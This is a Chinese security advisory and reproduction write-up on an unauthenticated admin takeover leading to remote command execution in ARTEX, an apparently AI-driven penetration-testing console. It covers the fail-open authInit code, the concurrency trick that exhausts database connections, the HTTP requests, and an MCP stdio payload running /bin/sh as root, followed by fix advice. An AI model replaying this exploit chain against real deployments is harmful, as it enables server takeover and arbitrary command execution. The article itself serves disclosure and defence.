#  【已复现】ARTEX存在未认证接管导致RCE漏洞  
 黑白之道   2026-10-21 01:07  
  
## 一、产品介绍  
  
  
ARTEX 是一款面向企业攻击面的 AI 自主渗透测试控制台，由 Go 后端与 Next.js 前端组成。 它支持任务编排、资产扫描、漏洞发现与利用、MCP 工具扩展，并可以通过 OpenAI / Anthropic 兼容接口接入上游大模型。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mkacf5KIV5Y45nHkzExdicwOCBUkuSMchBsG8e2ibicvu2EkViamVtyWnEofwAGrBlfmjia5yJxFpqt2zHAkTczsazNCSPgPBKevysK5QPVcqDsc/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=0 "")  
  
典型部署方式：  
- Go 单二进制，默认管理端口 8787  
（README 示例），MCP 代理端口 8788  
；  
  
- 依赖 PostgreSQL 存储任务、资产、MCP 配置与模型 Profile；  
  
- 支持 Docker Compose 部署，也支持直接运行二进制；  
  
- 管理端默认暴露在 0.0.0.0:8787  
，若直接映射到公网且未做额外访问控制，风险较高。  
  
ARTEX 的 MCP 管理接口支持 stdio  
、http  
、sse  
 三种传输。其中 stdio  
会由 ARTEX 主进程直接启动本地子进程，这是本文 RCE 链路的关键。  
## 二、漏洞原理  
### 2.1 缺陷代码  
  
POST /api/auth/init  
 用于"首次设置管理员密码"。它在判断是否已初始化时，**显式丢弃了数据库查询返回的 error**  
：  
```
// server/auth.go  (v0.3.14)func(s *Server) authInit(w http.ResponseWriter, r *http.Request) { pg := s.pg(w) existing, _, _ := pg.GetSetting(authPassKey)   // ← error 被丢弃if existing != "" {  writeErr(w, 403, "密码已设置")return }// ... bcrypt ...if err := pg.SetSetting(authPassKey, string(hash)); err != nil { ... } // ← upsert 覆盖 tok, _ := signJWT(s.jwtKey) writeJSON(w, 200, map[string]any{"token": tok})}
```  
### 2.2 "键不存在"与"读取失败"不可区分  
  
GetSetting  
 在两种情况下都返回空 value，唯一的区分标志是 error：  
```
func(d *DB) GetSetting(key string) (value string, ok bool, err error) { err = d.QueryRow(`SELECT value FROM settings WHERE key=$1`, key).Scan(&value)if err == sql.ErrNoRows {return"", false, nil       // 键不存在 }if err != nil {return"", false, err       // 读取失败，value 同样是 "" }return value, true, nil}
```  
  
authInit  
 忽略 error 后，"读取失败"被当成"从未设置密码"，于是继续执行写操作。  
### 2.3 未认证可达  
  
requireAuth  
 把整个 /api/auth/*  
 前缀列为白名单：  
```
if strings.HasPrefix(p, "/api/auth/") || p == "/api/health" { h.ServeHTTP(w, r)return}
```  
  
因此任何未认证访问者都可以无限并发地调用 /api/auth/init  
。  
### 2.4 触发条件：PostgreSQL 连接耗尽  
  
旧版没有设置 SetMaxOpenConns  
，database/sql  
 默认不限制应用侧连接数。 每个 /api/auth/init  
 请求都会执行一次 SELECT value FROM settings ...  
； 并发足够高时会把 PostgreSQL 的 max_connections  
 顶满，新连接被拒绝，GetSetting  
 返回 error，fail-open 随即生效。  
  
随后 SetSetting  
 使用 INSERT ... ON CONFLICT DO UPDATE  
（upsert）， 直接覆盖已存在的管理员密码哈希，并返回一个合法的管理员 JWT。  
### 2.5 从认证绕接到 RCE  
  
拿到管理员 JWT 后，POST /api/mcp  
 会接受 stdio  
 传输配置： 服务端把 command  
 与 args  
 交给 exec.Command  
 直接启动子进程。 这是 MCP 协议的固有设计——拥有 MCP 创建权限即拥有命令执行权限。 认证绕过把这一能力从"管理员"扩大到了"任何未认证访问者"。  
## 三、影响范围  
### 3.1 受影响版本  
<table><thead><tr><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">项目</span></section></th><th style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;font-weight: bold;background-color: rgb(255, 249, 249);color: rgb(239, 112, 96);"><section><span leaf="">内容</span></section></th></tr></thead><tbody><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">受影响版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">v0.1.0 – v0.3.14</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复版本</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">v0.3.15 及以后</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">修复提交</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><code><span leaf="">8d8c102</span></code><section><span leaf="">（PR <a class="wx_topic_link" topic-id="mvbtj11e-g2txlb" style="color: #576B95 !important;" data-topic="1" data-recommend="">#197</a>，分支 </span><code><span leaf="">fix/auth-init-fail-open</span></code><span leaf="">）</span></section></td></tr><tr><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">漏洞类型</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">CWE-636 Fail Open / CWE-754 异常条件处理不当</span></section></td></tr></tbody></table>### 3.2 影响后果  
1. **未认证管理员接管**  
：无需知道原密码，即可把管理员密码改成任意值；  
  
1. **服务器命令执行**  
：通过 stdio  
 MCP 以 ARTEX 进程权限执行任意命令；  
  
1. **横向风险**  
：ARTEX 本身具备资产扫描与漏洞利用能力，失陷后可被用作攻击跳板。  
  
## 四、复现过程  
### 4.1 指纹确认  
```
GET/api/healthHTTP/1.1Host: TARGET_HOST
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/mkacf5KIV5aMgU8ehTETPnpS3hX996305YqMOK3rdnicvn0BarreOhLMoEeHH1IJl1aJdUX9vc8EVlRAJic2DjicYc2TwFlF0emgu5nbGRagBU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1 "")  
  
确定是存在漏洞的版本  
### 4.2 并发触发 Fail-Open  
```
POST /api/auth/initBody: {"password":"<REDACTED_PASSWORD>"}并发: 800 轮次: 最多 2 轮
```  
  
两轮统计：  
```
{  "workers":800,"rounds":2,"codes":{"403":245,"200":44,"500":3,"TimeoutError":508}}
```  
- 44  
 个 200  
：fail-open 生效，管理员密码被覆盖；  
  
- 245  
 个 403  
：数据库读取正常，正确返回"密码已设置"；  
  
- 3  
 个 500  
：写入阶段失败；  
  
- 508  
 个连接异常：高并发下客户端侧连接被重置或超时。  
  
### 4.3 登录取得管理员 JWT  
```
POST/api/auth/loginHTTP/1.1Host: TARGET_HOSTContent-Type: application/jsonContent-Length: 58{"username":"ARTEX","password":"<REDACTED_PASSWORD>"}
```  
```
HTTP/1.1200Content-Length: 160{"token":"<REDACTED_JWT>"}
```  
### 4.5  发送 id RCE 请求  
  
Burp 数据包  
```
POST/api/mcpHTTP/1.1Host: TARGET_HOSTUser-Agent: artex-burp-proofAccept: application/jsonContent-Type: application/jsonAuthorization: Bearer <JWT>Content-Length: 510{"name": "test_rce_id", "transport": "stdio", "command": "/bin/sh","args": ["-c", "OUT=$(id 2>&1 | base64 -w0); read a; printf '%s\\n' '{\"jsonrpc\":\"2.0\",\"id\":1,\"result\":{\"protocolVersion\":\"2024-11-05\",\"capabilities\":{\"tools\":{}},\"serverInfo\":{\"name\":\"burp-id\",\"version\":\"1.0\"}}}'; read b; read c; printf '{\"jsonrpc\":\"2.0\",\"id\":2,\"result\":{\"tools\":[{\"name\":\"burp_id\",\"description\":\"%s\",\"inputSchema\":{\"type\":\"object\"}}]}}\\n' \"$OUT\""],"enabled": true}
```  
```
HTTP/1.1200Content-Type: application/jsonContent-Length: 10{"id":x} 
```  
  
{"id":x}  
 表示 MCP 条目创建成功。ARTEX 在创建时同步执行工具发现， 即在本机启动 /bin/sh -c "...id..."  
 并完成 MCP 握手。  
### 4.6 回读工具缓存，证明 id 已执行  
  
  
### 获取命令执行结果  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/mkacf5KIV5b2tSvic3icibGSk5kQJl4308iaqODRDNyv6lSP26QkqibJqpeCLkcjefrOqlaOicp1dWBnibnB2AK1j6Uibib0yPmRKcXWprO8h0xDvXK0/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=2 "")  
  
### 对 description 做 base64 解码：  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/mkacf5KIV5Zbic3l6dRjczKfu2teDaKfF4l0mqCMZHIlAy1kIKHZd1YrdhKeAuc1z5BUic6dQVobxMqGPVzM0oCOicDP65xM3ic0wHF205kmXicU/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=3 "")  
### id 返回 uid=0(root)，说明 MCP 子进程以 root 身份运行在 ARTEX 主机上， RCE 成立。  
### 4.8 整条利用链分析  
```
① POST /api/auth/init（无认证、可无限并发）        │        │  800 并发打满 PostgreSQL max_connections        ▼② GetSetting 返回 error        │        │  authInit 丢弃 error，existing="" 被当成"未初始化"        ▼③ SetSetting upsert 覆盖管理员密码哈希，返回 JWT        │        ▼④ POST /api/auth/login 用攻击者密码换取合法管理员会话        │        ▼⑤ POST /api/mcp，transport=stdio，command=/bin/sh        │        │  ARTEX 以自身进程权限 exec 子进程        ▼⑥ 子进程执行 id → uid=0(root)        │        │  结果封装进 MCP tool description        ▼⑦ GET /api/mcp/{id}/tools 回读缓存，得到命令输出
```  
  
## 五、修复建议  
### 5.1 升级到 v0.3.15+  
  
官方 8d8c102  
（PR [#197]()  
）已完成三处修复：  
1. authInit  
 / authStatus  
 读取出错时返回 503  
，改为 fail-closed；  
  
1. 写入由 upsert 改为 INSERT ... ON CONFLICT DO NOTHING  
，不再覆盖已有密码；  
  
1. 连接池设置上限（SetMaxOpenConns(32)  
 / SetMaxIdleConns(32)  
），并补充连接寿命与空闲淘汰。  
  
### 5.2 访问控制  
- 管理端口默认只监听 127.0.0.1  
；  
  
- 公网访问通过 VPN、SSH 隧道或带认证与访问控制的反向代理；  
  
- 对 /api/auth/init  
 增加来源限速与并发上限。  
  
### 5.3 认证与会话  
- JWT 绑定密码版本，改密后旧 token 立即失效；  
  
- 登录、改密、初始化全部写入审计日志（不记录凭据正文）；  
  
- 增加登录失败计数与持久化锁定。  
  
### 5.4 MCP 安全  
- 对 stdio  
 类型 MCP 的 command  
 / args  
 做白名单或禁用；  
  
- 定期审计 mcp_servers  
，删除可疑条目；  
  
- MCP 子进程使用低权限用户运行，避免 root。  
  
> ⚠️ **免责声明**  
：本文及该靶场仅供安全培训、教学与**授权**  
测试使用。请勿将其中漏洞技术用于任何未授权的目标，使用者需自行承担因不当使用造成的一切后果。  
  
  
文章来源：大白哥AI与安全  
  
